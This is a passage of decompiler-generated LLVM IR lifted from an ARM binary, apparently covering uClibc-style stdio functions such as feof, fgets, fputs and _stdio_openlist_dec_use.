  br label %dec_label_pc_139a8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_13990.dec_label_pc_139a8_crit_edge, %dec_label_pc_13984, %bb159
  %v1_139ac = phi i32 [ %v1_139ac.pre, %dec_label_pc_13990.dec_label_pc_139a8_crit_edge ], [ %v5_13974, %dec_label_pc_13984 ], [ %v5_13974, %bb159 ]
  %v0_139a8 = phi i32 [ %v0_139a8.pre, %dec_label_pc_13990.dec_label_pc_139a8_crit_edge ], [ %v5_13968, %dec_label_pc_13984 ], [ %v5_13968, %bb159 ]
  %v1_139a8 = add i32 %v0_139a8, -40
  %v2_139a8 = inttoptr i32 %v1_139a8 to i32*
  %v3_139a8 = load i32, i32* %v2_139a8, align 4
  store i32 %v3_139a8, i32* %r3.global-to-local, align 4
  %v2_139ac = add i32 %v1_139ac, 40
  %v3_139ac = inttoptr i32 %v2_139ac to i32*
  store i32 %v3_139a8, i32* %v3_139ac, align 4
  br label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_13990, %dec_label_pc_13964, %dec_label_pc_139a8
  %v0_139b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_139b0 = add i32 %v0_139b0, 28
  %v2_139b0 = inttoptr i32 %v1_139b0 to i32*
  %v3_139b0 = load i32, i32* %v2_139b0, align 4
  %v0_139b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_139b4 = add i32 %v0_139b4, 1
  store i32 %v1_139b4, i32* %r8.global-to-local, align 4
  %v1_139b8 = add i32 %v3_139b0, 2
  store i32 %v1_139b8, i32* %r3.global-to-local, align 4
  %v6_139c0 = icmp slt i32 %v1_139b4, %v1_139b8
  br i1 %v6_139c0, label %dec_label_pc_13928, label %dec_label_pc_139e4

dec_label_pc_139c8:                               ; preds = %dec_label_pc_1391c
  %v0_139c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_139c8 = add i32 %v0_139c8, 28
  %v2_139c8 = inttoptr i32 %v1_139c8 to i32*
  %v3_139c8 = load i32, i32* %v2_139c8, align 4
  store i32 %v3_139c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_139d0 = add i32 %v0_139c8, 38
  %v4_139d0 = inttoptr i32 %v3_139d0 to i8*
  store i8 1, i8* %v4_139d0, align 1
  %v0_139d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_139d4 = mul i32 %v0_139d4, 4
  store i32 %v3_139d4, i32* @r2, align 4
  %v0_139d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_139d8 = add i32 %v0_139d8, 40
  store i32 %v1_139d8, i32* @r0, align 4
  %v2_139dc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_139dc, i32* @r1, align 4
  %v0_139e0 = call i32 @memcpy()
  store i32 %v0_139e0, i32* %r0.global-to-local, align 4
  %v0_139e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139e4

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_139c8
  %v2_13a00 = phi i32 [ %v0_139e4.pre, %dec_label_pc_139c8 ], [ %v0_139b0, %dec_label_pc_139b0 ]
  %v1_139e4 = add i32 %v2_13a00, 16
  %v2_139e4 = inttoptr i32 %v1_139e4 to i32*
  %v3_139e4 = load i32, i32* %v2_139e4, align 4
  store i32 %v3_139e4, i32* %r3.global-to-local, align 4
  %v1_139e8 = and i32 %v3_139e4, 128
  %v2_139e8 = icmp eq i32 %v1_139e8, 0
  br i1 %v2_139e8, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_139e4
  %v3_139ec = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_139ec, i32* %r3.global-to-local, align 4
  %v2_139f0 = inttoptr i32 %v2_13a00 to i32*
  %v3_139f0 = load i32, i32* %v2_139f0, align 4
  %v2_139f8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_139f8 = sub i32 %v2_139f8.pre, %v3_139ec
  store i32 %v3_139f8, i32* %r3.global-to-local, align 4
  %v5_139fc = mul i32 %v3_139f8, 4
  %v6_139fc = add i32 %v5_139fc, %v3_139f0
  store i32 %v6_139fc, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_139e4
  %v1_139f445 = load i32, i32* %r6.global-to-local, align 4
  %v2_139f446 = add i32 %v1_139f445, 1
  store i32 %v2_139f446, i32* %r3.global-to-local, align 4
  %v3_13a00 = inttoptr i32 %v2_13a00 to i32*
  store i32 %v2_139f446, i32* %v3_13a00, align 4
  %v0_13a04.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_13a0c = phi i32 [ %v2_13a00, %.thread48 ], [ %v0_13a04.pre, %.thread50 ]
  %v1_13a04 = add i32 %v1_13a0c, 28
  %v2_13a04 = inttoptr i32 %v1_13a04 to i32*
  %v3_13a04 = load i32, i32* %v2_13a04, align 4
  store i32 %v3_13a04, i32* %r3.global-to-local, align 4
  %v1_13a08 = add i32 %v3_13a04, 2
  store i32 %v1_13a08, i32* %r0.global-to-local, align 4
  %v0_13a0c = load i32, i32* %fp.global-to-local, align 4
  %v2_13a0c = add i32 %v1_13a0c, 24
  %v3_13a0c = inttoptr i32 %v2_13a0c to i32*
  store i32 %v0_13a0c, i32* %v3_13a0c, align 4
  br i1 %v2_139e8, label %dec_label_pc_13a1c, label %bb161

bb161:                                            ; preds = %bb160
  %v1_13a10 = load i32, i32* @r2, align 4
  %v2_13a10 = load i32, i32* %r7.global-to-local, align 4
  %v3_13a10 = inttoptr i32 %v2_13a10 to i32*
  store i32 %v1_13a10, i32* %v3_13a10, align 4
  br label %dec_label_pc_13a1c

dec_label_pc_13a18:                               ; preds = %dec_label_pc_1390c, %dec_label_pc_1352c, %dec_label_pc_13674, %dec_label_pc_13720, %dec_label_pc_136f8, %dec_label_pc_13704, %dec_label_pc_13640, %dec_label_pc_13958, %dec_label_pc_138d8, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a1c

dec_label_pc_13a1c:                               ; preds = %bb161, %bb160, %dec_label_pc_13a18
  %v2_13a20 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13a20, i32* @r4, align 4
  store i32 %v6_134e8, i32* @r5, align 4
  store i32 %v27_134e8, i32* @lr, align 4
  %v1_13a24 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13a24

; uselistorder directives
  uselistorder i32 %v3_139f8, { 1, 0 }
  uselistorder i32 %v1_139b4, { 1, 2, 0 }
  uselistorder i32 %v2_13950, { 1, 0 }
  uselistorder i32 %v1_13950, { 1, 0, 2 }
  uselistorder i32 %v0_13970, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_13948, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1390c, { 1, 2, 0 }
  uselistorder i32 %v0_138fc, { 1, 0 }
  uselistorder i32 %v1_138d8, { 1, 0, 2 }
  uselistorder i32 %v1_1384c, { 1, 2, 0 }
  uselistorder i32 %v1_13834, { 1, 0 }
  uselistorder i32 %v2_1381c, { 2, 1, 0 }
  uselistorder i32 %v1_13800, { 0, 2, 3, 1 }
  uselistorder i32 %v0_137f8, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_137dc, { 1, 0, 2 }
  uselistorder i32 %v2_137c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_137b8, { 2, 1, 0 }
  uselistorder i32 %v1_13778, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13768.pre, { 0, 2, 1 }
  uselistorder i32 %v2_13744, { 1, 0 }
  uselistorder i32 %v5_136a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_136a4, { 1, 0 }
  uselistorder i32 %v0_136a876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_1364c, { 1, 0 }
  uselistorder i32 %v0_1366c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_13630, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13618, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_13608, { 1, 0 }
  uselistorder i32 %v3_13600, { 0, 2, 1 }
  uselistorder i8 %v2_13600, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13680, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_135c4, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_135b0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13598, { 1, 0 }
  uselistorder i32 %v3_135a4.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_1354c, { 0, 2, 1 }
  uselistorder i32 %v2_13538, { 1, 0, 2 }
  uselistorder i32 %v0_134ec, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 10, 12, 13, 11, 3, 4, 9, 5, 14, 6, 7, 8, 16, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1, 3 }
  uselistorder i32 1072, { 1, 2, 0, 3 }
  uselistorder i32 -5312, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_13a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a18, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_139e4, { 1, 0 }
  uselistorder label %dec_label_pc_139b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13964, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13730, { 1, 0 }
  uselistorder label %dec_label_pc_136e4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1365c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_135fc, { 1, 0 }
  uselistorder label %dec_label_pc_135f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_135fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1359c, { 1, 0 }
  uselistorder label %dec_label_pc_13570, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_13a58 = load i32, i32* @r4, align 4
  store i32 %v3_13a58, i32* %stack_var_-20, align 4
  %v2_13a5c = add i32 %tmp, 52
  %v3_13a5c = inttoptr i32 %v2_13a5c to i32*
  %v4_13a5c = load i32, i32* %v3_13a5c, align 4
  store i32 83344, i32* %r5.global-to-local, align 4
  %v1_13a64 = sub i32 1, %v4_13a5c
  %v2_13a64 = icmp ult i32 %v4_13a5c, 2
  br i1 %v2_13a64, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_13a64, %entry ]
  %v0_13a6c = phi i32 [ 0, %bb ], [ %v1_13a64, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_13a6c = icmp eq i32 %v0_13a6c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_13a6c, label %dec_label_pc_13ab8, label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %thread-pre-split
  %v2_13a84 = add i32 %tmp, 56
  store i32 %v2_13a84, i32* %r4.global-to-local, align 4
  %v4_13a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13a98)
  %v0_13aac = load i32, i32* %r5.global-to-local, align 4
  %v2_13aac = add i32 %v0_13aac, 20
  %v3_13aac = inttoptr i32 %v2_13aac to i32*
  %v4_13aac = load i32, i32* %v3_13aac, align 4
  store i32 %v4_13aac, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_13aac)
  %v0_13ab8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13abc.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_13ab8.pre, 0
  br label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %thread-pre-split, %dec_label_pc_13a80
  %v0_13abc = phi i32 [ %tmp, %thread-pre-split ], [ %v0_13abc.pre, %dec_label_pc_13a80 ]
  %v0_13ab8 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_13a80 ]
  %v1_13abc = inttoptr i32 %v0_13abc to i16*
  %v2_13abc = load i16, i16* %v1_13abc, align 2
  %v3_13abc = zext i16 %v2_13abc to i32
  store i32 %v3_13abc, i32* %r4.global-to-local, align 4
  br i1 %v0_13ab8, label %dec_label_pc_13ab8..thread4_crit_edge, label %bb15

dec_label_pc_13ab8..thread4_crit_edge:            ; preds = %dec_label_pc_13ab8
  %v0_13ad4.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_13ab8
  %v1_13acc = load i32, i32* %r5.global-to-local, align 4
  %v3_13acc = add i32 %v1_13acc, 28
  %v4_13acc = inttoptr i32 %v3_13acc to i32*
  %v5_13acc = load i32, i32* %v4_13acc, align 4
  store i32 %v5_13acc, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13ab8..thread4_crit_edge, %bb15
  %v0_13ad4 = phi i32 [ %v0_13ad4.pre, %dec_label_pc_13ab8..thread4_crit_edge ], [ %v5_13acc, %bb15 ]
  %v2_13ad4 = xor i1 %v0_13ab8, true
  call void @__pseudo_cond_branch(i1 %v2_13ad4, i32 %v0_13ad4)
  %v0_13ad8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ad8 = and i32 %v0_13ad8, 4
  %v2_13ae0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13ae0, i32* @r4, align 4
  ret i32 %v1_13ad8

; uselistorder directives
  uselistorder i1 %v0_13ab8, { 1, 0 }
  uselistorder i32 %v1_13a64, { 1, 0 }
  uselistorder i32 %v4_13a5c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_13ab8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_13aec(i32 %arg1) local_unnamed_addr {
dec_label_pc_13aec:
  %v0_13aec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13aec, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13aec
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13aec, %bb
  %v10_13af8 = phi i32 [ %arg1, %dec_label_pc_13aec ], [ 0, %bb ]
  ret i32 %v10_13af8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13afc = load i32, i32* @r4, align 4
  store i32 %v3_13afc, i32* %stack_var_-28, align 4
  %v6_13afc = load i32, i32* @r5, align 4
  %v9_13afc = load i32, i32* @r6, align 4
  %v12_13afc = load i32, i32* @r7, align 4
  %v21_13afc = load i32, i32* @lr, align 4
  %v1_13b00 = add i32 %arg3, 52
  %v2_13b00 = inttoptr i32 %v1_13b00 to i32*
  %v3_13b00 = load i32, i32* %v2_13b00, align 4
  %v1_13b08 = sub i32 1, %v3_13b00
  %v2_13b08 = icmp ult i32 %v3_13b00, 2
  br i1 %v2_13b08, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_13b08, %entry ]
  %v0_13b10 = phi i32 [ 0, %bb ], [ %v1_13b08, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_13b10 = icmp eq i32 %v0_13b10, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_13b10, label %dec_label_pc_13b64, label %dec_label_pc_13b2c

dec_label_pc_13b2c:                               ; preds = %bb16
  %v1_13b30 = add i32 %arg3, 56
  store i32 %v1_13b30, i32* @r4, align 4
  %v4_13b44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b44)
  %v0_13b58 = load i32, i32* @r5, align 4
  %v2_13b58 = add i32 %v0_13b58, 20
  %v3_13b58 = inttoptr i32 %v2_13b58 to i32*
  %v4_13b58 = load i32, i32* %v3_13b58, align 4
  store i32 %v4_13b58, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_13b64.1065 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13b58)
  %v0_13b64.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_13b68.pre = load i32, i32* @r7, align 4
  %v0_13b6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13b64

dec_label_pc_13b64:                               ; preds = %bb16, %dec_label_pc_13b2c
  %v0_13b6c = phi i32 [ %arg3, %bb16 ], [ %v0_13b6c.pre, %dec_label_pc_13b2c ]
  %v0_13b68 = phi i32 [ %arg2, %bb16 ], [ %v0_13b68.pre, %dec_label_pc_13b2c ]
  %v0_13b64 = phi i32 [ %arg1, %bb16 ], [ %v0_13b64.pre, %dec_label_pc_13b2c ]
  %v3_13b70 = inttoptr i32 %v0_13b64 to i8*
  %v4_13b70 = call i32 @__GI_fgets_unlocked(i8* %v3_13b70, i32 %v0_13b68, i32 %v0_13b6c)
  %v0_13b74 = load i32, i32* %sl.global-to-local, align 4
  %v2_13b74 = icmp eq i32 %v0_13b74, 0
  store i32 %v4_13b70, i32* %r4.global-to-local, align 4
  br i1 %v2_13b74, label %dec_label_pc_13b64..thread3_crit_edge, label %bb17

dec_label_pc_13b64..thread3_crit_edge:            ; preds = %dec_label_pc_13b64
  %v0_13b90.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_13b64
  %v1_13b88 = load i32, i32* @r5, align 4
  %v3_13b88 = add i32 %v1_13b88, 28
  %v4_13b88 = inttoptr i32 %v3_13b88 to i32*
  %v5_13b88 = load i32, i32* %v4_13b88, align 4
  store i32 %v5_13b88, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13b64..thread3_crit_edge, %bb17
  %v0_13b90 = phi i32 [ %v0_13b90.pre, %dec_label_pc_13b64..thread3_crit_edge ], [ %v5_13b88, %bb17 ]
  %v2_13b90 = xor i1 %v2_13b74, true
  call void @__pseudo_cond_branch(i1 %v2_13b90, i32 %v0_13b90)
  %v0_13b94 = load i32, i32* %r4.global-to-local, align 4
  %v2_13b9c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13b9c, i32* @r4, align 4
  store i32 %v6_13afc, i32* @r5, align 4
  store i32 %v9_13afc, i32* @r6, align 4
  store i32 %v12_13afc, i32* @r7, align 4
  store i32 %v21_13afc, i32* @lr, align 4
  ret i32 %v0_13b94

; uselistorder directives
  uselistorder i32 %v3_13b00, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13b64, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_13ba8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ba8:
  %v0_13ba8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ba8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13ba8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13ba8, %bb
  %v10_13bb4 = phi i32 [ %arg1, %dec_label_pc_13ba8 ], [ 0, %bb ]
  ret i32 %v10_13bb4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13bb8 = load i32, i32* @r4, align 4
  store i32 %v3_13bb8, i32* %stack_var_-24, align 4
  %v6_13bb8 = load i32, i32* @r5, align 4
  %v9_13bb8 = load i32, i32* @r6, align 4
  %v12_13bb8 = load i32, i32* @r7, align 4
  %v15_13bb8 = load i32, i32* @r8, align 4
  %v18_13bb8 = load i32, i32* @lr, align 4
  %v1_13bbc = add i32 %arg2, 52
  %v2_13bbc = inttoptr i32 %v1_13bbc to i32*
  %v3_13bbc = load i32, i32* %v2_13bbc, align 4
  %v1_13bc4 = sub i32 1, %v3_13bbc
  %v2_13bc4 = icmp ult i32 %v3_13bbc, 2
  br i1 %v2_13bc4, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_13bc4, %entry ]
  %v0_13bcc = phi i32 [ 0, %bb ], [ %v1_13bc4, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_13bcc = icmp eq i32 %v0_13bcc, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_13bcc, label %dec_label_pc_13c1c, label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %thread-pre-split
  %v1_13be8 = add i32 %arg2, 56
  store i32 %v1_13be8, i32* @r4, align 4
  %v4_13bfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13bfc)
  %v0_13c10 = load i32, i32* @r5, align 4
  %v2_13c10 = add i32 %v0_13c10, 20
  %v3_13c10 = inttoptr i32 %v2_13c10 to i32*
  %v4_13c10 = load i32, i32* %v3_13c10, align 4
  store i32 %v4_13c10, i32* @ip, align 4
  store i32 80924, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13c10)
  %v0_13c1c.pre = load i32, i32* @r7, align 4
  %v0_13c20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13c1c

dec_label_pc_13c1c:                               ; preds = %thread-pre-split, %dec_label_pc_13be4
  %v0_13c20 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_13c20.pre, %dec_label_pc_13be4 ]
  %v0_13c1c = phi i32 [ %arg1, %thread-pre-split ], [ %v0_13c1c.pre, %dec_label_pc_13be4 ]
  %v2_13c24 = inttoptr i32 %v0_13c1c to i8*
  %v3_13c24 = call i32 @__GI_fputs_unlocked(i8* %v2_13c24, i32 %v0_13c20)
  %v0_13c28 = load i32, i32* @r8, align 4
  %v2_13c28 = icmp eq i32 %v0_13c28, 0
  store i32 %v3_13c24, i32* %r4.global-to-local, align 4
  br i1 %v2_13c28, label %dec_label_pc_13c1c..thread6_crit_edge, label %bb16

dec_label_pc_13c1c..thread6_crit_edge:            ; preds = %dec_label_pc_13c1c
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_13c1c
  %v1_13c3c = load i32, i32* @r5, align 4
  %v3_13c3c = add i32 %v1_13c3c, 28
  %v4_13c3c = inttoptr i32 %v3_13c3c to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13c1c..thread6_crit_edge, %bb16
  %v0_13c44.in = phi i32* [ @ip, %dec_label_pc_13c1c..thread6_crit_edge ], [ %v4_13c3c, %bb16 ]
  %v0_13c44 = load i32, i32* %v0_13c44.in, align 4
  %v2_13c44 = xor i1 %v2_13c28, true
  call void @__pseudo_cond_branch(i1 %v2_13c44, i32 %v0_13c44)
  %v0_13c48 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13c50, i32* @r4, align 4
  store i32 %v6_13bb8, i32* @r5, align 4
  store i32 %v9_13bb8, i32* @r6, align 4
  store i32 %v12_13bb8, i32* @r7, align 4
  store i32 %v15_13bb8, i32* @r8, align 4
  store i32 %v18_13bb8, i32* @lr, align 4
  ret i32 %v0_13c48

; uselistorder directives
  uselistorder i32 %v1_13bc4, { 1, 0 }
  uselistorder i32 %v3_13bbc, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_13c1c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_13c5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c5c:
  %v0_13c5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c5c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13c5c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13c5c, %bb
  %v10_13c68 = phi i32 [ %arg1, %dec_label_pc_13c5c ], [ 0, %bb ]
  ret i32 %v10_13c68

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13c6c = load i32, i32* @r4, align 4
  store i32 %v3_13c6c, i32* %stack_var_-24, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r6.global-to-local, align 4
  %v4_13c7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 40) to i32*), align 4
  store i32 %v4_13c7c, i32* %r8.global-to-local, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_13c84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 116) to i32*), align 4
  store i32 %v4_13c84, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_13c90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 %v4_13c90, i32* %r7.global-to-local, align 4
  %v2_13c9c = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_13c90)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_13cb0 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cb0 = add i32 %v0_13cb0, 20
  %v3_13cb0 = inttoptr i32 %v2_13cb0 to i32*
  %v4_13cb0 = load i32, i32* %v3_13cb0, align 4
  store i32 %v4_13cb0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13cb0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_13cc0 = load i32, i32* %r6.global-to-local, align 4
